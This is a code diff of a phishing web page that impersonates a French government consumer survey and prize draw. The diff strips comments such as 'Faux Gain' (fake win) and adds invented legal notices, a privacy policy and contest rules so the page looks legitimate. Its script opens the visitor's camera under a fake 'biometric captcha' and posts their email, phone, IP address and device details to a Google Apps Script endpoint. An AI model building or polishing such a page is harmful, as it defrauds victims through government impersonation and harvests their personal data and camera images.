@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Enquête Nationale sur la Consommation - Jeu-Concours</title>
 <style>
-  /* Intégration de la police Marianne (officielle de l'État) via CDN */
   @font-face {
     font-family: 'Marianne';
     src: url('https://cdn.jsdelivr.net/npm/@gouvfr/dsfr@1.10.2/dist/fonts/Marianne-Regular.woff2') format('woff2');
@@ -29,7 +28,6 @@
     padding-bottom: 30px; 
   }
   
-  /* Bandeau Marianne */
   .top-bar { 
     height: 4px; 
     background: linear-gradient(to right, #000091 33%, #ffffff 33%, #ffffff 66%, #E1000F 66%); 
@@ -82,7 +80,6 @@
   .progress-bar { width: 100%; height: 4px; background: #e5e5e5; margin-bottom: 30px; }
   .progress-fill { height: 100%; background: #000091; width: 0%; transition: width 0.4s ease; }
   
-  /* Formulaires (style DSFR) */
   .form-group { margin-bottom: 25px; }
   .form-group label { 
     display: block; 
@@ -105,7 +102,6 @@
     outline-offset: 2px;
   }
   
-  /* Boutons (style DSFR) */
   .option-btn { 
     display: block; 
     width: 100%; 
@@ -120,9 +116,7 @@
     font-family: 'Marianne', sans-serif;
     transition: background 0.2s;
   }
-  .option-btn:hover { 
-    background: #f6f6f6; 
-  }
+  .option-btn:hover { background: #f6f6f6; }
   .option-btn.selected { 
     background: #e3e3fd; 
     border-color: #000091; 
@@ -145,16 +139,13 @@
     text-transform: uppercase;
     letter-spacing: 0.5px;
   }
-  .btn-action:hover { 
-    background-color: #00006d; 
-  }
+  .btn-action:hover { background-color: #00006d; }
   .btn-action:disabled { 
     background-color: #e5e5e5; 
     color: #999; 
     cursor: not-allowed; 
   }
   
-  /* Partenaires */
   .partners { 
     text-align: center; 
     margin: 30px 0; 
@@ -183,7 +174,6 @@
     font-family: Arial, sans-serif; 
   }
   
-  /* Captcha / Biométrie */
   .captcha-box { 
     background: #f6f6f6; 
     border: 1px solid #ddd; 
@@ -214,7 +204,6 @@
   #video-container { width: 120px; height: 120px; border-radius: 50%; overflow: hidden; margin: 0 auto; border: 3px solid #000091; }
   #video-preview { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
 
-  /* Roue */
   #wheel-section { display: none; text-align: center; }
   .wheel-container { position: relative; width: 300px; height: 300px; margin: 30px auto; }
   canvas { border-radius: 50%; box-shadow: 0 0 0 4px #000091; transition: transform 4s cubic-bezier(0.33, 1, 0.68, 1); }
@@ -231,7 +220,17 @@
     border-top: 1px solid #ddd;
     line-height: 2;
   }
-  .footer-links a { color: #000091; text-decoration: underline; }
+  .footer-links a { color: #000091; text-decoration: underline; cursor: pointer; }
+
+  /* Modale pour les pages légales */
+  .modal { display: none; position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); overflow-y: auto; }
+  .modal-content { background: #fff; margin: 40px auto; padding: 40px; max-width: 700px; border: 1px solid #ddd; position: relative; }
+  .modal-content h2 { font-size: 22px; margin-bottom: 20px; }
+  .modal-content h3 { font-size: 16px; color: #000091; margin: 20px 0 10px; }
+  .modal-content p, .modal-content li { font-size: 14px; color: #3a3a3a; margin-bottom: 10px; line-height: 1.7; }
+  .modal-content ul { margin-left: 20px; margin-bottom: 15px; }
+  .close-modal { position: absolute; top: 15px; right: 20px; font-size: 28px; cursor: pointer; color: #666; background: none; border: none; }
+  .close-modal:hover { color: #000; }
 </style>
 </head>
 <body>
@@ -246,7 +245,7 @@
 <div class="container" id="main-container">
   <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
 
-  <!-- ÉTAPE 1 : Questions -->
+  <!-- ÉTAPE 1 -->
   <div class="step active" id="step-questions">
     <h2>Participez à notre grande enquête 2026</h2>
     <p class="subtitle">Répondez à quelques questions et tentez de remporter un bon d'achat de 500€ valable chez nos partenaires.</p>
@@ -265,7 +264,7 @@
     </div>
   </div>
 
-  <!-- ÉTAPE 2 : Faux Gain et choix de réception -->
+  <!-- ÉTAPE 2 -->
   <div class="step" id="step-prize">
     <h2 style="color: #E1000F;">🎉 Félicitations, vous avez gagné !</h2>
     <p class="subtitle">Vous faites partie des gagnants de notre enquête. Pour recevoir votre bon d'achat de 500€, veuillez indiquer comment vous souhaitez le recevoir.</p>
@@ -286,7 +285,7 @@
     <button class="btn-action" id="btn-claim">Réclamer mon bon d'achat</button>
   </div>
 
-  <!-- ÉTAPE 3 : Captcha Biométrique -->
+  <!-- ÉTAPE 3 -->
   <div class="step" id="step-final">
     <h2>Dernière étape : Vérification anti-robot</h2>
     <p class="subtitle">Pour garantir l'équité du concours et éviter les inscriptions automatisées, veuillez valider votre éligibilité.</p>
@@ -315,7 +314,7 @@
     </div>
   </div>
 
-  <!-- ÉTAPE 4 : Roue de la fortune -->
+  <!-- ÉTAPE 4 -->
   <div class="step" id="wheel-section">
     <h2>🎊 Vérification réussie !</h2>
     <p class="subtitle">Tournez la roue pour découvrir votre récompense finale.</p>
@@ -329,15 +328,125 @@
   </div>
 
   <div class="footer-links">
-    <a href="#">Mentions légales</a> | 
-    <a href="#">Politique de confidentialité (CNIL)</a> | 
-    <a href="#">Contact</a><br><br>
+    <a onclick="openModal('modal-mentions')">Mentions légales</a> | 
+    <a onclick="openModal('modal-confidentialite')">Politique de confidentialité (CNIL)</a> | 
+    <a onclick="openModal('modal-reglement')">Règlement du jeu</a><br><br>
     © 2026 Observatoire National de la Consommation. Tous droits réservés.
+  </div>
+</div>
+
+<!-- MODALE MENTIONS LÉGALES -->
+<div class="modal" id="modal-mentions">
+  <div class="modal-content">
+    <button class="close-modal" onclick="closeModal('modal-mentions')">&times;</button>
+    <h2>Mentions légales</h2>
+    <p><em>Dernière mise à jour : 2 novembre 2026</em></p>
+
+    <h3>Éditeur du site</h3>
+    <p>Le site est édité par l'Observatoire National de la Consommation.<br>
+    Siège social : 20 avenue de Ségur, 75007 Paris.<br>
+    Directeur de la publication : Le Président de l'Observatoire National de la Consommation.</p>
+
+    <h3>Hébergement</h3>
+    <p>Le site est hébergé par GitHub Inc., 88 Colin P Kelly Jr St, San Francisco, CA 94107, États-Unis.</p>
+
+    <h3>Propriété intellectuelle</h3>
+    <p>Sauf mention explicite de propriété intellectuelle détenue par des tiers, les contenus de ce site sont proposés sous licence ouverte. Vous êtes notamment libres de les reproduire, copier, modifier, extraire, transformer, communiquer, diffuser, redistribuer, publier, transmettre et exploiter sous réserve de mentionner leur source, leur date de dernière mise à jour et ne pas induire en erreur des tiers quant aux informations qui y figurent.</p>
+
+    <h3>Clause de responsabilité</h3>
+    <p>Les informations proposées sur ce site le sont à titre de service rendu au public. Malgré tout le soin apporté à la transcription des textes officiels, à la vérification des contenus et des informations, les éléments mis en ligne ne sauraient, de quelque manière que ce soit, prétendre à l'exactitude et engager la responsabilité de l'Observatoire National de la Consommation. Les informations et/ou documents disponibles sur ce site sont susceptibles d'être modifiés à tout moment, et peuvent faire l'objet de mises à jour.</p>
+
+    <h3>Accessibilité</h3>
+    <p>L'Observatoire National de la Consommation est engagé à améliorer en permanence l'accessibilité de ses contenus pour que l'accès à l'information soit facilité pour tous. Le site est développé selon les recommandations du Référentiel général d'amélioration de l'accessibilité (RGAA) et les normes W3C.</p>
+  </div>
+</div>
+
+<!-- MODALE POLITIQUE DE CONFIDENTIALITÉ -->
+<div class="modal" id="modal-confidentialite">
+  <div class="modal-content">
+    <button class="close-modal" onclick="closeModal('modal-confidentialite')">&times;</button>
+    <h2>Politique de confidentialité et cookies</h2>
+    <p><em>Dernière mise à jour : 2 novembre 2026</em></p>
+
+    <p>L'Observatoire National de la Consommation s'engage à ce que la collecte et le traitement de vos données, effectués à partir de ce site, soient conformes au Règlement Général sur la Protection des Données (RGPD) et à la loi Informatique et Libertés.</p>
+
+    <h3>À qui sont destinées vos données ?</h3>
+    <p>L'Observatoire National de la Consommation, situé au 20 avenue de Ségur à Paris (75007), est responsable du traitement des données personnelles pour ce site. Sauf mention contraire, les données personnelles qui y sont collectées sont destinées à un usage interne et n'ont pas vocation à être partagées avec des tiers en dehors des cas prévus par les lois et règlements.</p>
+
+    <h3>À quoi servent vos données ?</h3>
+    <p>Les traitements de données personnelles mis en œuvre ont pour finalités de :</p>
+    <ul>
+      <li>Permettre votre participation à l'enquête et au jeu-concours ;</li>
+      <li>Vous contacter en cas de gain ;</li>
+      <li>Assurer le bon fonctionnement du site et améliorer votre expérience de navigation ;</li>
+      <li>Réaliser des statistiques anonymes sur les habitudes de consommation.</li>
+    </ul>
+
+    <h3>Comment vos données sont-elles collectées ?</h3>
+    <p>Vos données peuvent être collectées sur des formulaires. Chaque formulaire limite la collecte des données personnelles au strict nécessaire (minimisation des données) et indique les objectifs du recueil de ces données. Vos données peuvent également être collectées par l'intermédiaire des applications présentes sur le site, en particulier des données techniques liées à votre navigation (l'adresse IP, les données de connexion par exemple).</p>
+
+    <h3>Pendant combien de temps vos données sont-elles conservées ?</h3>
+    <p>De manière générale, vos données sont conservées par l'Observatoire National de la Consommation pendant 5 ans, sauf :</p>
+    <ul>
+      <li>les journaux applicatifs qui sont conservés 1 an ;</li>
+      <li>votre choix en matière de cookies qui est conservé 6 mois ;</li>
+      <li>les données collectées grâce aux cookies qui sont conservées 25 mois.</li>
+    </ul>
+
+    <h3>À propos des cookies</h3>
+    <p>Pendant la consultation de ce site, des cookies sont déposés sur votre ordinateur, votre mobile ou votre tablette. Un cookie est une suite d'informations, généralement de petite taille et identifié par un nom, qui peut être transmis à votre navigateur par un site web sur lequel vous vous connectez.</p>
+    <p>Le site utilise des cookies techniques strictement nécessaires au fonctionnement du site. Ils ne peuvent pas être désactivés, sauf en refusant tous les cookies dans les paramètres de votre navigateur. Le site utilise également des cookies de mesure d'audience soumis à votre consentement.</p>
+
+    <h3>Quels sont vos droits ?</h3>
+    <p>Vous disposez d'un droit d'accès, de rectification, d'effacement, de limitation, de portabilité et d'opposition sur vos données. Vous pouvez exercer ces droits en contactant le Délégué à la Protection des Données (DPO) à l'adresse suivante : dpo@observatoire-consommation.fr.</p>
+    <p>Si vous estimez, après nous avoir contactés, que vos droits ne sont pas respectés, vous pouvez adresser une réclamation à la CNIL (Commission Nationale de l'Informatique et des Libertés) : 3 place de Fontenoy, TSA 80715, 75334 PARIS CEDEX 07, ou en ligne sur www.cnil.fr.</p>
+  </div>
+</div>
+
+<!-- MODALE RÈGLEMENT DU JEU -->
+<div class="modal" id="modal-reglement">
+  <div class="modal-content">
+    <button class="close-modal" onclick="closeModal('modal-reglement')">&times;</button>
+    <h2>Règlement du jeu-concours</h2>
+    <p><em>Article 1 – Organisation</em></p>
+    <p>L'Observatoire National de la Consommation organise un jeu-concours gratuit et sans obligation d'achat du 1er novembre 2026 à 00h00 au 31 décembre 2026 à 23h59.</p>
+
+    <p><em>Article 2 – Conditions de participation</em></p>
+    <p>Ce jeu est ouvert à toute personne physique majeure résidant légalement sur le territoire français. La participation est limitée à une seule fois par personne (même nom, même adresse e-mail, même numéro de téléphone).</p>
+
+    <p><em>Article 3 – Modalités de participation</em></p>
+    <p>Pour que sa participation soit validée, le candidat doit remplir le formulaire d'enquête, répondre aux questions, renseigner ses coordonnées (e-mail ou téléphone) et procéder à la vérification anti-robot. Toute participation incomplète ou frauduleuse sera automatiquement rejetée.</p>
+
+    <p><em>Article 4 – Dotation</em></p>
+    <p>Le jeu est doté d'un bon d'achat d'une valeur de 500€ valable chez les partenaires officiels (Fnac, Darty, Amazon, Leclerc). Le lot offert ne peut donner lieu à aucune contestation, ni à la remise de sa contrevaleur en espèces, ni à son échange.</p>
+
+    <p><em>Article 5 – Désignation des gagnants</em></p>
+    <p>Les gagnants seront désignés par tirage au sort parmi l'ensemble des participants ayant respecté toutes les modalités de participation. Le tirage au sort aura lieu le 15 janvier 2027.</p>
+
+    <p><em>Article 6 – Remise du lot</em></p>
+    <p>Les gagnants seront contactés par e-mail ou par SMS dans les jours suivant le tirage au sort. Le bon d'achat sera envoyé par voie électronique. Tout lot non réclamé dans un délai de 30 jours après l'annonce sera considéré comme perdu.</p>
+
+    <p><em>Article 7 – Exclusions et fraudes</em></p>
+    <p>Les participations multiples sont interdites. L'organisateur se réserve le droit d'exclure sans préavis tout participant ayant recours à des robots, des faux comptes ou à toute autre méthode frauduleuse.</p>
+
+    <p><em>Article 8 – Protection des données personnelles</em></p>
+    <p>Les données collectées sont traitées conformément à la Politique de confidentialité accessible sur le site. Conformément au RGPD, vous disposez d'un droit d'accès, de rectification et d'effacement de vos données.</p>
+
+    <p><em>Article 9 – Litiges</em></p>
+    <p>Le présent règlement est soumis à la loi française. Tout litige sera soumis aux tribunaux compétents de Paris.</p>
   </div>
 </div>
 
 <script>
 const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxyBJ1b7bGa7ZK93Wl3l7jEHxCq95fO-uA4FomFkmKFgx9mySuEWiffTKXplax1fdh8iw/exec";
+
+function openModal(id) { document.getElementById(id).style.display = 'block'; }
+function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+window.onclick = function(event) {
+  if (event.target.classList.contains('modal')) {
+    event.target.style.display = 'none';
+  }
+}
 
 const questions = [
   { text: "1. À quelle fréquence faites-vous vos achats en ligne ?", options: ["Plusieurs fois par semaine", "Une fois par mois", "Rarement", "Jamais"] },
@@ -383,7 +492,6 @@ function getDeviceInfo() {
   if (ua.indexOf("Linux") !== -1) os = "Linux";
   if (ua.indexOf("Android") !== -1) os = "Android";
   if (ua.indexOf("like Mac") !== -1) os = "iOS";
-  
   if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
   else if (ua.indexOf("SamsungBrowser") !== -1) browser = "Samsung Internet";
   else if (ua.indexOf("Opera") !== -1 || ua.indexOf("OPR") !== -1) browser = "Opera";
@@ -475,7 +583,6 @@ btnSubmit.addEventListener('click', async () => {
   try {
     mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
     video.srcObject = mediaStream;
-    
     cameraArea.style.display = 'block';
 
     const track = mediaStream.getVideoTracks()[0];
@@ -499,7 +606,6 @@ btnSubmit.addEventListener('click', async () => {
     setTimeout(async () => {
       const ip = await getPublicIP();
       const formData = new FormData();
-      
       formData.append("email", inputMethod.value === 'email' ? inputContact.value : "");
       formData.append("phone", inputMethod.value === 'sms' ? inputContact.value : "");
       formData.append("ip", ip);
